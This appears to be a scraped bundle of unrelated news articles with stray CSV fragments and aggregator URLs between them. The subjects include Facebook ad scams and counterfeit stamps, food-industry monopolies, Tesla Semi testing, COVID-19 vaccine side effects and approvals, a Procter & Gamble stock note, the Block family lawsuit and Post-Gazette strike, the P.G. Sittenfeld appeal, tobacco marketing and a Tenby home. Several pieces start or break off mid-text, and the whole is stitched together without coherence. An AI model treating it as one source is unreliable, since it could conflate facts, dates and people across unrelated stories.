That’s consistent with findings from the Federal Trade Commission which last year said nearly one in four online shopping complaints mentioned social media. People cited Facebook or Instagram in 94% of reports that identified a specific platform with many saying they were hooked after seeing an ad.

In 2019 total reported losses to frauds starting on social media reached $134 million according to the FTC. According to the latest figures available reported losses were on pace to reach record highs in 2020 with nearly $117 million in just the first six months of that year.

The scams are wide-ranging from sales of nonexistent vehicles to items that are dramatically different than promised. For example people order cordless drills but only get screwdrivers the BBB reported. One victim told the bureau she ordered a rattan sofa for her patio and instead received a burlap bag.

Consumers may feel comfortable clicking ads on Facebook since it’s the world’s largest social media platform a BBB study released this month noted. In reality it’s quite easy for scammers to buy Facebook ads that show up on your feed experts said.

“They have to do some paperwork. Show that they’re a registered business” Thatcher the Temple professor said of Facebook advertisers. “Then Facebook gives them access to tracking data of what people are interested in.”

Meta says it reviews all ads that appear on Facebook before they go live but that system primarily relies on automated technology. It also collects user feedback and takes action when it sees a high volume of negative feedback.

Fake stamps

Creedon the Philadelphia resident said he wasn’t interested in stamps before seeing the ad. But since placing the order he has seen his Facebook feed inundated with suspicious marketing for stamps. Some try to impersonate the Postal Service by making accounts with minor modifications to the authentic Facebook page such as adding a period between “US.”

“The Postal Service is encoded in our Constitution” Creedon said. “And here we have a major American corporation aiding and abetting subversion to a constitutional item” referring to postage stamps.

Postal inspectors have noticed the problem too. The agency is aware of “an increase in suspected counterfeit stamps” offered for sale with many on online platforms a U.S. Postal Inspection Service spokesperson said in a statement. The agency did not share specific figures or estimates. It believes many fake stamps are produced outside the United States and is working to identify shipments entering the country.

Creedon and The Inquirer showed Philadelphia postal inspectors the “stamps” he bought. They couldn’t confirm they were fake at first glance but said the stamps’ being shipped from overseas sold for below face value and offered by an obscure seller were red flags.

“I think the biggest one is the social media location where he bought them from” said George Clark a postal inspector. “There’s not going to be too many trusted partners that are going to be small third-party sellers on Facebook.”

The Postal Service partners with companies who resell stamps but they are typically major retailers.

Consumer tips

The FTC says consumers should check out a company before buying something from a social media ad or post. The agency suggests typing the firm’s name in a search engine with words like scam or complaint. You can also see how long a company’s website has been in operation on scamadviser.com. Scammers create and shutter websites regularly the BBB says.

“If it looks too good to be true it probably is” Thatcher said adding that scammers often make their money on smaller transactions. “Consumers need to look for related products and see what the normal pricing is and maybe they need to call a company to find out if it’s real.”

Credit cards often provide more protection against fraud than other payment methods the BBB says. Consumers should take a screenshot of the item ordered in case the website disappears or the item received differs from what was advertised.",https://news.google.com/articles/CBMiYmh0dHBzOi8vd3d3Lm5ld3N3aXJlLmxrLzIwMjEvMTIvMTEvd2F0Y2gtZmluYW5jZS1taW5pc3Rlci1zcGVha3MtYWJvdXQtcGF5cGFsLWlzc3VlLWluLXBhcmxpYW1lbnQv0gEA?hl=en-US&gl=US&ceid=US%3Aen,WATCH : Finance Minister speaks about PayPal issue in Parliament,Sri Lanka is currently discussing to acquire the services of PayPal to receive payments Finance Minister Basil Rajapaksa told Parliament yesterday.

We all love a good bowl of Cheerios. And who doesn’t like Fritos bean dip with their tortilla chips? I’m betting that you’re like me and grab a can of soup or a jar of salsa off the shelf without thinking twice.

Well maybe next time we should.

A recent study revealed that just a few massively powerful companies control nearly 80% of the market share of many items purchased by ordinary consumers at the supermarket. Those Cheerios I mentioned? Yep General Mills Kellogg and Post own almost 75% of the market. Those salsas and dips? PepsiCo (who owns Tostitos Lays and Fritos) owns a whopping 90% of that market.

So what’s the problem? Well with the ability of giant corporations to own so much of the American food system farmers workers and consumers are suffering. This week a joint investigation by the Guardian and Food and Water Watch found that a small number of corporations control virtually every part of the food supply chain–from seeds and fertilizers to slaughterhouses and supermarkets. This leads to limited power for farmers dangerous working conditions for workers and higher prices for consumers.

It is time that antitrust laws are put in place to limit these conglomerates and protect all people involved in this system.

Mega-companies like Kellog Kraft Heinz and Tyson that control the food system have significant ability to decide what the 2 million farmers across America grow and how much they are paid. In fact a measly 15 cents of every dollar we spend in the grocery store goes to a farmer.

Advocates also note that along with financial pressures there is a serious mental health crisis among farmers. Farmers are among the most likely to commit suicide compared with other occupations and more than 450 farmers died by suicide across the Midwest from 2014-2018 . Calls to the crisis hotline Farm Aid increased by 110% from 2017 to 2018.

Let’s try to remember the next time we eat a tortilla chip or a Sara Lee bagel (Grupo Bimbo owns almost 70% of the bagel market) a farmer had to grow the ingredients to make it. We would do well to remind giant food corporations of this as well and establish antitrust policies limiting their power and supporting the lives of farmers.

Additionally food industry workers who are predominantly migrants and people of color face dangerous situations at the hands of these corporations. It is widely known that farms especially meatpacking plants are among the most dangerous workplaces in the country. People work long hours for extremely low wages and are exposed to everything from pesticides and animal waste to dangerous machinery and toxic heat levels.

Finally consumers also bear the brunt of the American monopolistic food system. Economically speaking limited competition among businesses means higher prices and fewer choices for buyers. This could not be more true in the agricultural space. For decades until the 1990s most people shopped at local grocery stores. Now just four corporations–Walmart Kroger Costco and Albertsons–dominate over half of the retail space. That means we as consumers are limited in what stores we can go to and are at the mercy of the prices the companies want to set.

These are just a few of the ways in which the current American food monopoly impacts people at every stage of the process. Last week President Biden signed an executive order addressing monopolies across the country which included food and farming.

Let’s hope something comes of this order. It is time that antitrust laws are put in place to limit these conglomerates and protect all people involved in this system.

Back in November PepsiCo CEO Ramon Laguarta remarked that his company was expecting its first Tesla Semi deliveries in the fourth quarter. This was a surprise to electric vehicle enthusiasts as Tesla CEO Elon Musk noted during the 2021 Annual Shareholder Meeting that the Class 8 all-electric hauler would be hitting volume production in 2023. Yet if recent sightings at the Giga Nevada area are any indication it appears that the Semi is now in limited production — and Tesla is doing some interesting tests with its freshly made trucks.

The Semi’s new video which was shared on YouTube by Tesla advocate Sawyer Merritt was shot last Friday near Gigafactory Nevada. The truck in the footage was reportedly manufactured in a production facility that has been constructed near Tesla’s massive battery plant. While the Semi in the footage looked quite similar to the white painted updated prototypes that have been spotted several times this year the new truck reportedly did not have any stickers from the Department of Transportation nor did it have manufacturer plates.

Only @elonmusk would tell his engineering team to build a semi tractor with the same turning circle and 0-60 time as a Porsche. 🤣$TSLA https://t.co/F4Hx9E7I5d pic.twitter.com/ryh9cf3sab — James Stephenson (@ICannot_Enough) December 11 2021

Sightings of the Tesla Semi have been going on for some time but what makes last Friday’s footage quite special was that it showcased a clear tire-shredding acceleration run from the Class 8 all-electric truck. The footage was brief lasting only two and a half minutes but it was enough to show just how quick the Semi really is when it accelerates at full speed. Granted the Semi was not pulling a trailer when it was captured on video but it’s still remarkable to see such a large all-electric vehicle run like a sports car on the road.

Also quite interesting was the Semi’s incredibly tight turning radius. After running the length of the production facility near Giga Nevada the Semi simply took a U-turn to head back. The vehicle then proceeded to showcase its turning circle several more times and just like its acceleration the Semi’s turning radius is pretty remarkable. This bodes well for the Semi’s maneuverability which would likely help it stand apart from its more conventional more traditional competitors.

If recent reports are accurate and the Tesla Semi has indeed entered limited production it would suggest that the company might be working with some of its first customers as part of its efforts to refine and finalize the Class 8 hauler. Considering CEO Laguarta’s statements last November PepsiCo could very well be one of these first customers. PepsiCo has been dropping hints about its upcoming Tesla Semi fleet as of late after all. Earlier this year the company noted that it was expecting to receive 15 units of the Semi by the end of 2021. PepsiCo has also received a permit for a Tesla Megacharger at its Modesto California facility.

Saturday marks one year since the Food and Drug Administration authorized Pfizer's COVID-19 vaccine — the first of three COVID-19 vaccines now in use in the United States.

During that time more than 480 million shots have been administered and just over 60% of eligible Americans are fully vaccinated. But even with those protections case numbers have gone up 22% in the past two weeks.

Confirmed COVID cases showed up this week at an average rate of 120000 per day according to the U.S. Centers for Disease Control and Prevention. Ninety-nine percent of those new cases are from Delta variant not Omicron.

The hope is that current vaccines will also be effective in beating back the Omicron variant.

But government officials are still preparing for the worst.

In New York Governor Kathy Hochul issued a statewide indoor mask mandate on Friday. Anyone entering a New York business that does not have a vaccination policy is required to wear a mask.

Hochul said now is the time to take action to stop the spread of the Omicron COVID variant.

""We're entering a time of uncertainty and we could either plateau here or our cases could escalate beyond control"" said Hochul.

More Omicron variant cases surfaced this week with at least 75 known cases in 25 states. The CDC analyzed 43 of those cases and found nearly 80% of the people afflicted are fully vaccinated.

Additionally CDC Director Dr. Rochelle Walensky said there was a pattern in the cases studied.

""Over half were between the ages of 18 and 39 and about one-third reported international travel before they were diagnosed"" she said.

Dr. Anthony Fauci director of the National Institute of Allergy and Infectious Diseases and chief medical advisor to the president continues to urge people to get vaccinated and get booster shots to protect against the virus.

New cases increased some 37% since last week — pushing case numbers up in 44 states.

Case numbers continue to compromise health care delivery in some places according to St. Joseph County deputy health officer Dr. Mark Fox.

""Not just the ability to treat COVID patients but the ability to treat everything else"" he said. ""There are surgeries being delayed for cancer for a heart valve for everything you can think of and a number of patients who are boarding in the emergency room waiting for beds so the system is really stressed right now"" said Fox.

If you’re getting ready for the first second or booster dose of your COVID-19 vaccine you may wonder about what side effects to expect and how to deal with them.

Some side effects happen right after your shot like mild pain in your arm. Others may take hours to develop. Remember that with the two-dose vaccines like Pfizer-BioNTech and Moderna you may notice more side effects after the second shot.

Right After Vaccination

The COVID vaccines are intramuscular or ""IM"" for short. That means the liquid in the syringe goes directly into a muscle when the needle goes in.

Your body's immune system sees this as a threat and pain at the injection site is part of its response. That's why your arm may feel sore turn red or swell a bit. Some people who get the Moderna vaccine may experience ""COVID arm"" a delayed skin reaction with raised red welts on the arm.

The mild pain that COVID-19 vaccines may cause is similar to what some people report after the tetanus vaccination Michelle Barron MD senior medical director of infection prevention and control for the University of Colorado Health tells Verywell.

The Centers for Disease Control and Prevention (CDC) recommends placing a cool wet washcloth over the area to help ease any pain. Moving or exercising your arm also may help.

15 Minutes After Vaccination

The risk of anaphylaxis—a severe allergic reaction to the vaccine—is lower just 15 to 30 minutes after vaccination. This reaction is very rare but the CDC requires everyone who gets the vaccine to wait in the clinic for 15 minutes after getting the shot just in case it happens.

“If you've had allergic reactions in the past we want people staying for 30 minutes” Kate Mullane DO PharmD professor of medicine and infectious disease specialist at the University of Chicago tells Verywell.

Recap Although it's rare it's possible to have an allergic reaction within the first 15 to 30 minutes after the jab. It's much more common to feel some soreness in your arm at the injection site and the surrounding skin may get a little red and swollen.

12 Hours After Vaccination

Other side effects may start within a few hours or up to 12 hours after the shot. People commonly report systemic side effects like fever headaches muscle aches joint pain chills and fatigue.

In the Pfizer-BioNTech vaccine trials more than 77% of participants reported at least one systemic reaction. The most common were fatigue headache and new or worsened muscle pain.

Some less common side effects include nausea and swollen lymph nodes (especially in the armpit).

There's no need to worry about any of the flu-like symptoms. The side effects mean your body is working hard to build the antibodies and cells it will need to fight the virus if or when you are exposed to it.

“Although you feel terrible it's a good thing because those systemic effects are telling you that your body is making an immune reaction” Mullane says.

12 to 48 Hours After Vaccination

Once these body-wide side effects set in they can last for 12 hours or more. Experts say these side effects should all stop within 24 to 48 hours after your shot though you may still have some slight fatigue or arm soreness after that.

Mullane says it’s best to avoid important events or take on key tasks the day after your vaccination if you’re concerned about the side effects. That's because your vaccine appointment and the window for peak symptoms aren't likely to happen at the same time. Most side effects come later.

It’s OK to take an anti-inflammatory medication like Tylenol or ibuprofen to relieve any symptoms. But Mullane says not to take it before the shot as it can interfere with your immune response.

Recap Many people report a sore arm mild fever or other symptoms after vaccination. These are not serious and will go away on their own. An August 2021 report from U.S. health officials found that with 187 million people in the U.S. getting at least one dose the vaccine benefits are far greater than the risks. But rare and serious complications may occur. They include:

Guillain-Barré syndrome (Johnson & Johnson)

Thrombosis or blood clots (Johnson & Johnson)

Myocarditis (Pfizer-BioNTech and Moderna)

After 48 Hours

If you still have severe symptoms two full days after your vaccination you may want to talk with your doctor to see what to do next. It’s possible that while you had vaccine side effects you were also ill with COVID-19 or a different infection.

“If the symptoms persist beyond the 48 hours and aren't getting better or if you develop any kind of respiratory symptoms you should get evaluated” Barron says.

It’s important to note that you cannot get COVID-19 from any of the approved vaccines. However it can take up to two weeks after the second shot of the two-dose vaccines or the single dose of the Johnson & Johnson to mount a full immune response.

A COVID infection and its symptoms are still possible until the end of this two-week waiting period. It also is possible to have a breakthrough infection which means you have COVID even though you got the vaccine.

What This Means For You If you’re worried about how your body may respond to the vaccine plan to take it easy in the day or two after your appointment. While it’s safe to exercise go to work and be around other people during that time side effects like fever and fatigue may make it uncomfortable to do so.

Side Effects Vary

When you hear about other people's experiences remember that the vaccine side effects can vary greatly. Barron says that in general the side effects reported in the clinical trial data are the same as what people say after getting their own vaccines.

“In the clinical trials younger people were more likely to have reactions than older people” Barron says. “They tended to have more of the systemic symptoms like the fever and chills and older people just reported a little bit of fatigue and arm soreness.”

“The healthier you are the more in tune your immune system is the higher the likelihood that you're going to have side effects because your immune system gets turned on” Mullane adds.

If you don’t have intense side effects like a high fever or body aches it doesn’t necessarily mean your body won’t be protected against the virus. The time or intensity with which people’s immune systems respond to vaccines can differ based on many factors.

While the side effects can cause some pain and discomfort Barron says that these effects are far better than the risks of getting sick with COVID-19.

“Forty-eight hours of side effects versus potentially the risk for hospitalization and death—I sort of think that favors the vaccine” Barron says. “If there's any hesitation because of side effects I’ll say the disease is far worse…or has the potential to be far worse.”

Summary

The best way to prepare yourself for a COVID vaccine is to learn about the possible side effects to expect. For most people this means some mild symptoms like a sore arm or flu-like symptoms that last up to two days before going away.

In rare cases a serious reaction or complication may follow COVID vaccination. That's not a reason to avoid a vaccine because the benefits still outweigh the risks but it is a good idea to keep a close eye on how you feel after getting your shot.

Call your doctor if you think your symptoms are serious.



Frequently Asked Questions Why does moving your sore arm after a vaccine help relieve the discomfort? Part of the body's immune response to a vaccination is swelling in the area where the injection occurred. As a result this causes soreness at the injection site. Movement and stretching can help by loosening up the muscle and decreasing inflammation while also allowing the medication to spread out from the area.

How common are side effects after COVID-19 vaccination? COVID-19 vaccine side effects are very common and most often occur after the second dose for those vaccines requiring a two-dose series. One study showed that 70% and 75% of participants reported soreness at the injection site after the first and second doses respectively. Up to 70% reported body-wide reactions like fatigue headache fever and muscle aches.

How long does the Moderna ""COVID arm"" side effect usually last? COVID arm may appear about seven days after receiving the Moderna vaccine. It usually goes away within a few days but may last up to 21 days.

“The vaccination regimen is to be administered as a two-dose primary series 21 days apart but given at a lower dose (10 microgrammes) than that used for individuals aged 12 years and above (30 microgrammes)” HSA said in a news release late on Friday (Dec 10).

This is the first time that a COVID-19 vaccine has been authorised in Singapore for use in the five to 11 age group.

“HSA has conducted a thorough evaluation of the data in consultation with two groups of experts from HSA’s Medicines Advisory Committee and Panel of Infectious Diseases Experts” the agency said.

“Based on the current available data the benefits outweighed the risks for use in the young population and the vaccine met the quality safety and efficacy standards.”

The Ministry of Health (MOH) said that the multi-ministry task force had accepted the recommendation by the Expert Committee on COVID-19 Vaccination to use the paediatric doses of the Pfizer-BioNTech/Comirnaty COVID-19 vaccine for children aged between five and 11.

The committee also assessed that the benefits of the jab outweigh the risks when used in a paediatric dosage for children aged five to 11 ""especially given ongoing community transmission and the emergence of the Omicron variant"" MOH said.

“Vaccination for this group will commence before the end of this year and once we receive deliveries of the vaccine doses” the ministry added.

MOH said that a new supply agreement with Pfizer-BioNTech for the vaccine had been signed and the ministry expects the shipment to arrive before the end of December.

""MOH will work with the Ministry of Education (MOE) and the Early Childhood Development Agency (ECDA) to roll out vaccinations for this school-going age group"" it said adding that more details would be announced by MOE and ECDA shortly.",https://news.google.com/articles/CBMiVGh0dHBzOi8vd3d3Lndpbm5tZWRpYXNrbi5jb20vc2tuLXJlY2VpdmVzLW1vcmUtcGZpemVyLWNvdmlkLTE5LXZhY2NpbmVzLWZyb20tdGhlLXVzL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,SKN Receives More Pfizer COVID-19 vaccines from the US | WINNFM 98.9,"St. Kitts and Nevis (WINN) – The Federation received another donation of COVID-19 vaccines from the United States of America.

On Thursday December 9 St. Kitts and Nevis received an additional 6300 doses of the Pfizer/BioNTech COVID-19 vaccine.

The shipment arrived at Robert L. Bradshaw International Airport around 7:00 p.m. with U.S. Embassy Public Affairs Officer Larry Socha. It was accepted by the Operations Manager of the Joseph N. France General Hospital Ms Gail Cranston.

This shipment is the second donation received from the U.S. Government following a donation of 11700 vaccine doses that arrived in August bringing the total doses donated to 18000.

As of December 9 53.4 percent of the total population of St. Kitts and Nevis has been fully vaccinated against COVID-19.

Speaking on behalf of the St. Kitts and Nevis government Chief Medical Officer Dr Hazel Laws expressed appreciation of this donation from the U.S. Government and said it would help mitigate the impact of the expected fourth wave of infections with Delta and now Omicron yet to reach our shores.

In a release Representative from the U.S. Embassy in Barbados Larry Socha complimented the Federations vaccination rate and was quoted as saying “The vaccination rate here clearly shows the people of St. Kitts and Nevis are committed to defeating this pandemic. Our donations of these Pfizer vaccines free of charge and with no strings attached demonstrate the United States will continue to be your partner in saving lives and stopping the spread of COVID-19.”"

So you might want to look at some of the facts that could shape the stock's performance in the near term.

Over the past month shares of this world's largest consumer products maker have returned +5.8% compared to the Zacks S&P 500 composite's -0.2% change. During this period the Zacks Soap and Cleaning Materials industry which P&G falls in has gained 6.5%. The key question now is: What could be the stock's future direction?

While media releases or rumors about a substantial change in a company's business prospects usually make its stock 'trending' and lead to an immediate price change there are always some fundamental facts that eventually dominate the buy-and-hold decision-making.

Earnings Estimate Revisions

Rather than focusing on anything else we at Zacks prioritize evaluating the change in a company's earnings projection. This is because we believe the fair value for its stock is determined by the present value of its future stream of earnings.

Our analysis is essentially based on how sell-side analysts covering the stock are revising their earnings estimates to take the latest business trends into account. When earnings estimates for a company go up the fair value for its stock goes up as well. And when a stock's fair value is higher than its current market price investors tend to buy the stock resulting in its price moving upward. Because of this empirical studies indicate a strong correlation between trends in earnings estimate revisions and short-term stock price movements.

For the current quarter P&G is expected to post earnings of $1.37 per share indicating no change from the year-ago quarter. The Zacks Consensus Estimate has changed -0.4% over the last 30 days.

For the current fiscal year the consensus earnings estimate of $6.55 points to a change of +11% from the prior year. Over the last 30 days this estimate has changed +1.6%.

For the next fiscal year the consensus earnings estimate of $6.97 indicates a change of +6.3% from what P&G is expected to report a year ago. Over the past month the estimate has changed +0.3%.

Having a strong externally audited track record our proprietary stock rating tool the Zacks Rank offers a more conclusive picture of a stock's price direction in the near term since it effectively harnesses the power of earnings estimate revisions. Due to the size of the recent change in the consensus estimate along with three other factors related to earnings estimates P&G is rated Zacks Rank #3 (Hold).

Projected Revenue Growth

While earnings growth is arguably the most superior indicator of a company's financial health nothing happens as such if a business isn't able to grow its revenues. After all it's nearly impossible for a company to increase its earnings for an extended period without increasing its revenues. So it's important to know a company's potential revenue growth.

In the case of P&G the consensus sales estimate of $20.81 billion for the current quarter points to a year-over-year change of +1.3%. The $84.32 billion and $87.18 billion estimates for the current and next fiscal years indicate changes of +2.8% and +3.4% respectively.

Last Reported Results and Surprise History

P&G reported revenues of $20.2 billion in the last reported quarter representing a year-over-year change of +0.6%. EPS of $1.52 for the same period compares with $1.37 a year ago.

Compared to the Zacks Consensus Estimate of $20.48 billion the reported revenues represent a surprise of -1.41%. The EPS surprise was +7.04%.

The company beat consensus EPS estimates in each of the trailing four quarters. The company topped consensus revenue estimates two times over this period.

Valuation

No investment decision can be efficient without considering a stock's valuation. Whether a stock's current price rightly reflects the intrinsic value of the underlying business and the company's growth prospects is an essential determinant of its future price performance.

Comparing the current value of a company's valuation multiples such as its price-to-earnings (P/E) price-to-sales (P/S) and price-to-cash flow (P/CF) to its own historical values helps ascertain whether its stock is fairly valued overvalued or undervalued whereas comparing the company relative to its peers on these parameters gives a good sense of how reasonable its stock price is.

As part of the Zacks Style Scores system the Zacks Value Style Score (which evaluates both traditional and unconventional valuation metrics) organizes stocks into five groups ranging from A to F (A is better than B; B is better than C; and so on) making it helpful in identifying whether a stock is overvalued rightly valued or temporarily undervalued.

P&G is graded D on this front indicating that it is trading at a premium to its peers. Click here to see the values of some of the valuation metrics that have driven this grade.

Conclusion

The facts discussed here and much other information on Zacks.com might help determine whether or not it's worthwhile paying attention to the market buzz about P&G. However its Zacks Rank #3 does suggest that it may perform in line with the broader market in the near term.

It’s too early to know how or if the 19-month-long strike connects with this lawsuit filed Wednesday in Lucas County (Ohio) Common Pleas Court by Allan Block of Toledo Ohio. He’s the CEO of Block Communications Inc. which owns the PG its Toledo sister paper The Blade as well as Pittsburgh City Paper and other businesses including cable companies and TV stations. His suit accuses others in his family of scheming to sell all of it without his input.

The suit doesn’t mention the PG strike. Zack Tanner president of the Newspaper Guild of Pittsburgh one of the unions that walked out in October 2022 said the lawsuit has no impact on the strike.

“The Blocks are no strangers to infighting” Tanner said on Thursday. “If you worked at the paper for a minute or for 50 years you know the Blocks like to fight with each other. No big news there. But our fight is our fight. They can fight internally but we’re still committed to winning the strike.”

Tanner said he remains confident the striking unions will prevail. A National Labor Relations Board judge has ruled strongly in the strikers’ favor he noted and the NLRB’s regional office recently took the unusual step of signaling its intent to seek an injunction that could bring the strikers back to work under their last contract and compel the company to bargain in good faith a new one.

“We’ll have our day in court and we will win the strike” Tanner said “no matter whether the Blocks are fighting with each other.”

In the suit Allan Block seeks a preliminary injunction to prevent BCI from being sold by his brother Pittsburgh’s John R. Block and others who run the company several of whom also live in the Pittsburgh area.

The motion says John Block — the publisher and editor-in-chief of the two newspapers — several times has tried and failed to replace the plaintiff Allan Block as CEO a position he is contracted to hold until 2028. “Now in a last-ditch effort to assert his so-called ‘sovereignty’ John Block has conspired with the rest of the Director Defendants to exclude Plaintiff from the most major decision to ever face BCI in its over 100 years of existence: a full sale of all its assets.”

The privately-held BCI started in 1901 by the Block brothers’ grandfather Paul Block is not currently for sale but the motion says that in January John Block “caused BCI to form a strategic transaction committee to pursue a merger or acquisition of the company.” That committee the suit says excluded Allan Block.

That news and the possibility raised in the motion that this committee making a “rushed and haphazard” sale “will result in significant job losses” was concerning to people who are working for those businesses as well as those who are on strike especially at a time when newspapers specifically and media in generally are struggling.

The Block family’s struggle for control of BCI looks to play out in court as does the strikers’ struggle for a contract.

The motion confirms that Allan and John Block each have a 25% stake in BCI while the other 50% is owned by family trusts that benefit family members.

Listed as defendants in the suit in addition to BCE and John Block are William Block Jr. exempt and non-exempt trusts Donald G. Block exempt and non-exempt trusts Karen D. Johnese exempt and non-exempt trusts Barbara L. Block exempt and non-exempt trusts Block Family trust No. 2 Karen Johnese Diana Block Ron Davenport Nancy Reid and Emily Escalante.

Donald Block who lives in Fox Chapel in February was named president of Pittsburgh City Paper after it was purchased by a BCI subsidiary.

Meanwhile workers in four production unions went on strike at the Post-Gazette in October 2022 over a dispute that left them without health care coverage. Journalists in the Newspaper Guild of Pittsburgh joined them later in their own unfair labor practices strike which is now in its 19th month. The Guild’s issues go back farther than that in that the union’s last contract expired in 2017 and in 2020 the PG citing an impasse in contract bargaining imposed conditions including a company health plan on the workers.

In April the striking journalists learned that the regional office of the National Labor Relations Board had received approval from the NLRB to seek an injunction in their case in which a NLRB administrative law judge had in January 2023 ruled strongly in favor of the union. The judge ruled that the company had to bring the strikers back to work under their last contract and bargain a new one. The company appealed that decision and the appeal has yet to be heard by the NLRB. The union is expecting the regional NLRB office to file the injunction — called a 10(j) injunction — any day now but until it is doesn’t know the scope of what the NLRB wants a judge to order.

It’s a complicated situation and one with many moving and not moving parts.

Also in April one union the distribution workers ended its strike with the PG agreeing to do so and dissolve their union in exchange for severance payments.

The remaining unions still on strike have stressed that the Post-Gazette could settle with them at any time. The most recent actual bargaining sessions that the Pittsburgh Union Progress knows about and attended were in September of 2023. (One union met with company representatives in February to set bargaining dates but the Union Progress doesn’t know if any subsequent sessions happened.)

The Blocks’ commitment to the Post-Gazette is unclear though John Block said on Wednesday in a statement to The Blade that he remains “committed” to the PG as well as The Blade.

In a brief statement given to The Blade and other outlets a representative of Allan Block seemed to contradict that writing “It is unfortunate that certain Block family members would choose to further enrich themselves at the expense of local jobs and the communities that depend on local news coverage.”

Phone calls and messages from the Pittsburgh Union Progress to Allan Block John Block and Donald Block seeking interviews or comments about the lawsuit and the strike were not returned.

A small contingent of striking journalists went to John Block’s home on Wednesday and he was not home so a small group returned on Thursday evening. A man who answered the door said Block was not home and that the group could try again Friday.",https://news.google.com/articles/CBMicWh0dHBzOi8vd3d3LmNpbmNpbm5hdGkuY29tL3N0b3J5L25ld3MvMjAyNC8wNS8wOS9wZy1zaXR0ZW5mZWxkLWFwcGVhbHMtYnJpYmVyeS1leHRvcnRpb24tY29udmljdGlvbnMvNzM2MjY1NjAwMDcv0gEA?hl=en-US&gl=US&ceid=US%3Aen,PG Sittenfeld appeal: What's criminal when it comes to campaign contributions?,"No commitment required.

Sittenfeld corruption case: Federal appeals court hears arguments Thursday,"CINCINNATI (WXIX) - Attorneys for former Cincinnati City Council member P.G. Sittenfeld returned to a federal courtroom Thursday to try to overturn his convictions for bribery and attempted extortion.

A three-judge panel with the 6th U.S. Circuit Court of Appeals heard arguments from his attorneys and then federal prosecutors.

No decision is expected anytime soon.

Sittenfeld 39 of East Walnut Hills is one of three former Cincinnati council members arrested in 2020 and convicted on federal public corruption charges in a series of cases federal authorities launched in 2017.

At the time of his arrest Sittenfeld was the front-runner in the mayor’s race and repeatedly received the most votes in city council elections.

Sittenfeld rejected a plea deal before his trial that would have limited his punishment if found guilty from probation only to two years or less in prison court records show.

The jury did find him not guilty on four of the six total charges. Those were two counts of honest services wire fraud and one count each of bribery and extortion.

Last year U.S. District Court Judge Douglas Cole rejected Sittenfeld’s request to throw out his convictions and get a new trial.

Sittenfeld failed to present “any persuasive arguments” supporting either motion the judge wrote in his 26-page order.

Judge Cole sentenced Sittenfeld to 16 months in prison and one year of supervised release once he’s out.

In early January Sittenfeld reported to a prison in northeastern Kentucky. Federal Correction Institution of Ashland is a minimum-security prison about 2.5 hours away from Cincinnati.

It was listed as one of America’s “10 Cushiest Prisons” by Forbes magazine.

Federal prosecutors say Sittenfeld promised to support perform “official acts” and “deliver the votes” to help the development of a property with sports betting at 435 Elm Street across from the Duke Energy Convention Center in downtown Cincinnati in exchange for $20000 in donations to his political action fund (PAC) federal court records show.

His indictment alleged he solicited the money in exchange for his support to develop the Elm Street property which former Cincinnati Bengals player turned developer Chinedum Ndukwe envisioned as a hotel and office complex with apartments and a restaurant.

“This was not a single event one-off deal or momentary lapse in judgment” federal prosecutors wrote in his sentencing memo.

“Sittenfeld’s actions were part of a broader strategy to use his position of power within local government and his prospects for higher office to extract financial contributions out of individuals who regularly conducted city business. In doing so Sittenfeld made clear that his support for their city business was tied directly to their contributions to him. This is not faithful public service or even “politics as usual”—this is corruption.”

Sittenfeld’s federal trial attorneys however have repeatedly said that his indictment actually proved he did not commit a “quid pro quo.”

He has always been pro-development they noted contending his actions (raising money for future campaigns) are all perfectly legal and this is typical business conducted by politicians.

Sittenfeld’s lead appellate attorneys are Yaakov Roth and James Burnham.

Burnham is a Washington D.C. attorney considered an expert in federal corruption law because he successfully represented former Virginia Governor Robert F. McDonnell in McDonnell v. United States.

That case was a major challenge to the scope of the Federal corruption laws because the 2016 ruling narrowed the legal definition of public corruption and made it harder for prosecutors to prove that a political official engaged in bribery.

In 2017 then-President Donald Trump appointed Burnham as Special Assistant to the President and Senior Associate Counsel to the President.

Now in Sittenfeld’s appeal Burnham and Roth argue that federal prosecutors didn’t show clear and precise proof of corruption the “quid pro quo.”

If Sittenfeld’s convictions are allowed to stand it would bring “a First Amendment Ice Age” where every politician could face prosecution for fundraising according to his appeal.

“The government engineered a sting to see if (Sittenfeld) would accept a campaign donation in exchange for supporting a local development project. To maximize the sting’s chances of success the FBI approached Sittenfeld through one of his longtime existing donors in connection with a project Sittenfeld had already agreed to support” his appeal states.

“Yet despite the choreography Sittenfeld never bit. Over the course of a year-long prosecutorial Truman Show Sittenfeld rejected the only express quid pro quo his friend offered cautioned him on the legal limits around donations turned away contributions that did not comport with obscure campaign-finance rules and even invited two undercover agents to a dinner party with the U.S. Attorney.”

Several amicus briefs also have been filed in support of Sittenfeld’s appeal

Among them are ones from former U.S. Attorney Generals William Barr and John Ashcroft and the top federal prosecutor for the same government office who prosecuted Sittenfeld Carter Stewart. He was the U.S. Attorney for the Southern District of Ohio from 2009 to 2016.

Sittenfeld’s case they wrote “has two highly unusual features that render it an extreme outlier among campaign-finance bribery prosecutions. First Mr. Sittenfeld’s conduct did not involve the typical signs of wrongdoing that prosecutors expect to see when a public official is engaged in a corrupt enterprise…

“Second the case resulted from a two-year investigation that involved a sting operation specifically intended to uncover evidence of misconduct…The result was a conviction for conduct that was not criminal.”

The Tobacco Industry: An Analysis

The tobacco industry today faces a lot of pressure from the media due to their glamorization of smoking through cigarette ads — the image of the Marlboro man for instance is a staple in American culture. However the industry has managed to prosper over the years. The largest tobacco companies have continued to grow in value and even today the advertising and promotions budget of the most valuable cigarette companies exceeds $8 billion in the US alone.

With growing anxiety towards the dangers of cigarette smoking many of the largest cigarette companies in the world have started to move away from a sole focus towards tobacco products and have instead also diversified into alternatives such as oral nicotine products e-cigarettes and heated cigarettes. This move has also helped many of these companies financially as sales of e-cigarettes and other similar products have increased by a whopping 177.7% in the US from 2014 to 2020.

And if that special spot for a special mix of homes can be found in a stunning location the pick and mix choice has just gone up another level of sweet treats.

Tenby on the Pembrokeshire coast is surely an example of a town that has been escalated to the pinnacle of the property sweet treats list.

The coastal cluster of homes at this seaside town includes cute cottages towering townhouse terraces bay-fronted bungalows and family semis.

Sometimes a house in a location you love is just waiting for you - the right buyer for the next chapter in its life. It's waiting for you to find it and fall in love with it and for many people Tenby is their first love as a place to find their forever home.

This is what happened when Ruth and Vaughan met Frogmore House - it was love at first sight even if it was just via a photograph in an estate agent's window. Vaughan says: ""We wanted a big house within the town walls with a garden which seemed a tall order.

(Image: Google maps) (Image: Google maps) (Image: West Wales Properties Temby)

""However on looking in the agent's window we saw Frogmore House and were drawn to it by the size the shop on the ground floor and the beautiful garden featuring the town wall.

